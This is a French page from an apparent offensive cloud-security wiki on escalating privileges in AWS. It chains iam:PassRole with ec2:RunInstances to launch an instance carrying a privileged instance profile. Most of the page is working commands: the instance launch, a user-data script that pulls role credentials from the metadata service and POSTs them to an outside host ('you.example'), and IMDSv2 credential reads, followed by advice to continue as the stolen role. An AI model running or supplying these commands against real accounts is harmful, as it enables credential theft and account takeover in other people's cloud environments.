---
title: "EC2 : PassRole vers RunInstances pour un profil d'instance privilégié"
description: "iam:PassRole avec ec2:RunInstances pour lancer une instance portant un profil d'instance privilégié, puis lire les identifiants de son rôle depuis le service de métadonnées."
keywords:
  - PassRole
  - RunInstances
  - profil d'instance
  - EC2
  - IMDS
---

# EC2

Avec `iam:PassRole` et `ec2:RunInstances` (plus `iam:PassRole` sur un rôle dont la politique de confiance autorise `ec2.amazonaws.com`), vous lancez une instance qui porte un **profil d'instance** privilégié. Une fois démarrée, le service de métadonnées de l'instance distribue les identifiants de ce rôle, et vous les lisez parce que vous contrôlez l'instance.

## Lancer avec un rôle passé

```bash
# the instance profile wraps the privileged role
aws ec2 run-instances \
  --image-id ami-xxxxxxxx --instance-type t3.micro \
  --iam-instance-profile Name=<privileged-instance-profile> \
  --key-name <yourkey> --security-group-ids <sg>
```

Si vous n'avez pas besoin d'un accès réseau à la machine, passez un script **user-data** qui exfiltre les identifiants vers vous au démarrage, de sorte que vous n'ayez jamais besoin de SSH :

```bash
aws ec2 run-instances --image-id ami-xxxx --instance-type t3.micro \
  --iam-instance-profile Name=<privileged-instance-profile> \
  --user-data "$(printf '#!/bin/bash\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> | curl -X POST -d @- https://you.example')"
```

## Lire les identifiants sur l'instance

```bash
# IMDSv2 token then the role credentials
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

Ces clés sont celles du rôle privilégié ; exportez-les et poursuivez en tant que ce rôle.

## Notes d'exploitation

- La politique de confiance du rôle doit autoriser EC2 ; les rôles conçus comme profils d'instance le font déjà, de sorte que tout rôle de profil d'instance du compte est un candidat.
- Préférez la variante d'exfiltration par user-data dans un VPC verrouillé où vous ne pouvez pas atteindre l'instance directement.
- Voir [métadonnées d'instance](../../../credentials/instance-metadata/index.md) pour le détail de la récupération IMDSv1/v2 et par SSRF, et [user data EC2](../../../compute/ec2/user-data.md) pour le chemin du script de démarrage en profondeur.

## Outils

- **AWS CLI** (`ec2 run-instances`) : le lancement lui-même.
- **Pacu** (`ec2__startup_shell_script`) : automatise la variante de vol d'identifiants par user-data.

## Références

- [Rhino Security Labs: AWS privilege escalation (PassRole to EC2)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable PassRole scenarios](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
